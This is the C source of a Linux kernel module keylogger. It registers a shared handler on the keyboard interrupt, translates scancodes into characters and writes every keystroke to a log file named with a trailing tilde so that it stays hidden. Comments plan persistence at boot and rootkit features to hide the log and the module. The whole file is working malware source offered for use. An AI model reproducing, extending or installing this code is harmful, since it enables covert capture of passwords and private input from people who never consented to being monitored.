#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>
#include <linux/version.h>

#include <linux/fcntl.h>          
#include <linux/unistd.h>
#include <linux/syscalls.h>

#define KB_IRQ 1

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
#define VFS_WRITE kernel_write
#else
#define VFS_WRITE vfs_write
#endif

#if LINUX_VERSION_CODE > KERNEL_VERSION(5, 1, 0)
#define GET_DS KERNEL_DS
#else
#define GET_DS get_ds()
#endif

const char *NAME = "---Secret_Keylogger---";

//You can rename it to [filename]~ , Linux considers files ending in ~ as backup files and hence hides them.
const char *LOG_FILE = "/root/log~";
struct file* log_fp;
loff_t log_offset; //"loff_t" is a "long offset"
struct task_struct *logger;

/* DO: Stores information for logging. As of now, only the scancode is needed */
struct logger_data{
	unsigned char scancode;
} ld;


//struct inode ** delegated_inode;
/* =================================================================== */

// Hide file "log"

/*A program can open a file and then unlink it. ----- NU MI MERGE... 
If that was the only link to the file, the file now has zero names.
 But it won't be deleted until the last program closes the file.
 sSuch a file can be called hidden. This happens a lot. 
  A file system fills and someone finds an offending file. 
  They rm it. Then they wonder why the space wasn't freed. I must see this once a week or so.*/

/* Opens a file from kernel space. */
struct file* log_open(const char *path, int flags, int rights)
{
	struct file *fp = NULL;
    #ifdef set_fs
	mm_segment_t old_fs;
    #endif
	int error = 0;

	/* DO: Save current process address limit. */
    #ifdef set_fs
	old_fs = get_fs();
    //old_fs = get_fs();
	/* Set current process address limit to that of the kernel, allowing
 	 * the system call to access kernel memory.
	 */ 
	set_fs(GET_DS);
    #endif
	fp = filp_open(path, flags, rights);
	/* DO: Restore address limit to current process. */
    #ifdef set_fs
	set_fs(old_fs);
    #endif
	if(IS_ERR(fp)){
		/* Debugging... */
		error = PTR_ERR(fp);
		printk("log_open(): ERROR = %d", error);
		return NULL;
	}
	// else
	// {
	// 	//d_unlinkat(path);
	// 	//vfs_unlink("/root",path, delegated_inode);
	// }

	return fp;
}

/* Closes file handle. */
void log_close(struct file *fp)
{
	filp_close(fp, NULL);
}

/* Writes buffer to file from kernel space. */
int log_write(struct file *fp, unsigned char *data,
		unsigned int size)
{
    #ifdef set_fs
	mm_segment_t old_fs;
    #endif
	int ret;
    #ifdef set_fs
	old_fs = get_fs();
	set_fs(GET_DS);
    #endif
	ret = VFS_WRITE(fp, data, size, &log_offset);
	/* DO: Increase file offset, preparing for next write operation. */
	log_offset += size;
    #ifdef set_fs
	set_fs(old_fs);
    #endif
	return ret;
}

/* =================================================================== */

/* DO: Converts scancode to key and writes it to log file. */
void tasklet_logger(struct tasklet_struct * data)//unsigned long data)
{
	static int shift = 0;
	
	char buf[32];
	memset(buf, 0, sizeof(buf));
	/* Convert scancode to readable key and log it. */
	switch(ld.scancode){
		default: 
			return;

		case 1:
			strcpy(buf, "(ESC)"); break;

		case 2:
			strcpy(buf, (shift) ? "!" : "1"); break;

		case 3:
			strcpy(buf, (shift) ? "@" : "2"); break;

		case 4:
			strcpy(buf, (shift) ? "#" : "3"); break;
		
		case 5:
			strcpy(buf, (shift) ? "$" : "4"); break;

		case 6:
			strcpy(buf, (shift) ? "%" : "5"); break;

		case 7:
			strcpy(buf, (shift) ? "^" : "6"); break;

		case 8:
			strcpy(buf, (shift) ? "&" : "7"); break;

		case 9:
			strcpy(buf, (shift) ? "*" : "8"); break;

		case 10:
			strcpy(buf, (shift) ? "(" : "9"); break;

		case 11:
			strcpy(buf, (shift) ? ")" : "0"); break;

		case 12:
			strcpy(buf, (shift) ? "_" : "-"); break;

		case 13:
			strcpy(buf, (shift) ? "+" : "="); break;

		case 14:
			strcpy(buf, "(BACKSPACE)"); break;

		case 15:
			strcpy(buf, "(TAB)"); break;

		case 16:
			strcpy(buf, (shift) ? "Q" : "q"); break;

		case 17:
			strcpy(buf, (shift) ? "W" : "w"); break;

		case 18:
			strcpy(buf, (shift) ? "E" : "e"); break;

		case 19:
			strcpy(buf, (shift) ? "R" : "r"); break;

		case 20:
			strcpy(buf, (shift) ? "T" : "t"); break;

		case 21:
			strcpy(buf, (shift) ? "Y" : "y"); break;

		case 22:
			strcpy(buf, (shift) ? "U" : "u"); break;

		case 23:
			strcpy(buf, (shift) ? "I" : "i"); break;

		case 24:
			strcpy(buf, (shift) ? "O" : "o"); break;

		case 25:
			strcpy(buf, (shift) ? "P" : "p"); break;

		case 26:
			strcpy(buf, (shift) ? "{" : "["); break;

		case 27:
			strcpy(buf, (shift) ? "}" : "]"); break;

		case 28:
			strcpy(buf, "(ENTER)"); break;

		case 29:
			strcpy(buf, "(LEFTCTRL)"); break;

		case 30:
			strcpy(buf, (shift) ? "A" : "a"); break;

		case 31:
			strcpy(buf, (shift) ? "S" : "s"); break;

		case 32:
			strcpy(buf, (shift) ? "D" : "d"); break;

		case 33:
			strcpy(buf, (shift) ? "F" : "f"); break;
	
		case 34:
			strcpy(buf, (shift) ? "G" : "g"); break;

		case 35:
			strcpy(buf, (shift) ? "H" : "h"); break;

		case 36:
			strcpy(buf, (shift) ? "J" : "j"); break;

		case 37:
			strcpy(buf, (shift) ? "K" : "k"); break;

		case 38:
			strcpy(buf, (shift) ? "L" : "l"); break;
	
		case 39:
			strcpy(buf, (shift) ? ":" : ";"); break;

		case 40:
			strcpy(buf, (shift) ? "\"" : "'"); break;

		case 41:
			strcpy(buf, (shift) ? "~" : "`"); break;

		case 42:              //LEFTSHIFT
		case 54:
			shift = 1; break; //RIGHTSHIFT

		case 170:
		case 182:
			shift = 0; break;

		case 44:
			strcpy(buf, (shift) ? "Z" : "z"); break;
		
		case 45:
			strcpy(buf, (shift) ? "X" : "x"); break;

		case 46:
			strcpy(buf, (shift) ? "C" : "c"); break;

		case 47:
			strcpy(buf, (shift) ? "V" : "v"); break;
		
		case 48:
			strcpy(buf, (shift) ? "B" : "b"); break;

		case 49:
			strcpy(buf, (shift) ? "N" : "n"); break;

		case 50:
			strcpy(buf, (shift) ? "M" : "m"); break;

		case 51:
			strcpy(buf, (shift) ? "<" : ","); break;

		case 52:
			strcpy(buf, (shift) ? ">" : "."); break;
	
		case 53:
			strcpy(buf, (shift) ? "?" : "/"); break;

		case 56:
			strcpy(buf, "(R-ALT"); break;
	
		/* Space */
		case 55:
		case 57:
		case 58:
		case 59:
		case 60:
		case 61:
		case 62:
		case 63:
		case 64:
		case 65:
		case 66:
		case 67:
		case 68:
		case 70:
		case 71:
		case 72:
			strcpy(buf, " "); break;

		case 83:
			strcpy(buf, "(DEL)"); break;
	}
	log_write(log_fp, buf, sizeof(buf));
}

/* DO: Registers the tasklet for logging keys. */
DECLARE_TASKLET(my_tasklet, tasklet_logger);

/* ISR for keyboard IRQ. */
irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
	/* Set global value to the received scancode. */
	ld.scancode = inb(0x60); // On interrupt:
                            //I Read scan code from I/O port 0x60 (inb 0 x60)
                            //I Translate scan code into key code and action

	/* We want to avoid I/O in an ISR, so schedule a Linux tasklet to
	 * write the key to the log file at the next available time in a 
	 * non-atomic context.
	 */
	tasklet_schedule(&my_tasklet);
	
	return (irq_handler_t)IRQ_HANDLED;
}

/* Module entry point. */
static int __init kb_init(void)
{
	int ret;
	char buf[32];

	/* DO: Open log file as write only, create if it doesn't exist. */
	log_fp = log_open(LOG_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if(IS_ERR(log_fp)){
		printk(KERN_INFO "FAILED to open log file.\n");
		return 1;
	}
	else{
		/* DO: Log file opened, print debug message. */
		printk(KERN_INFO "SUCCESSFULLY opened log file.\n");

		/* DO: Write title to log file. */
		
		memset(buf, 0, sizeof(buf));
		strcpy(buf, "-LOG START-\n\n");
		log_write(log_fp, buf, sizeof(buf));
	}

	/* Request to register a shared IRQ handler (ISR). */

    /*Note that to get an interrupt, the developer calls request_irq(). 
    When calling this function you must specify the interrupt number (irq_no), 
    a handler that will be called when the interrupt is generated (handler), 
    flags that will instruct the kernel about the desired behaviour (flags), 
    the name of the device using this interrupt (dev_name), 
    and a pointer that can be configured by the user at any value, 
    and that has no global significance (dev_id). Most of the time, 
    dev_id will be pointer to the device driver's private data.*/ 

	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
			NAME, &ld);
	if(ret != 0){
		printk(KERN_INFO "FAILED to request IRQ for keyboard.\n");
	}

	return ret;
}

/* On module exit. */
static void __exit kb_exit(void)
{
	/* DO: Free the logging tasklet. */
	tasklet_kill(&my_tasklet);

	/* DO: Free the shared IRQ handler, giving system back original control. */
	free_irq(KB_IRQ, &ld);

	/* Close log file handle. */
	if(log_fp != NULL){
		log_close(log_fp);
	}
}

MODULE_LICENSE("GPL");
module_init(kb_init);
module_exit(kb_exit);

/*
 * Features to add later:
 * -Add module to system startup by appending itself to the proper 
 *  configuration file. These may differ for each distribution.
 * -Add rootkit abilities; hide log file from user view, hide module's
 *  prescence from user view.
 * -Process all special keys.
 */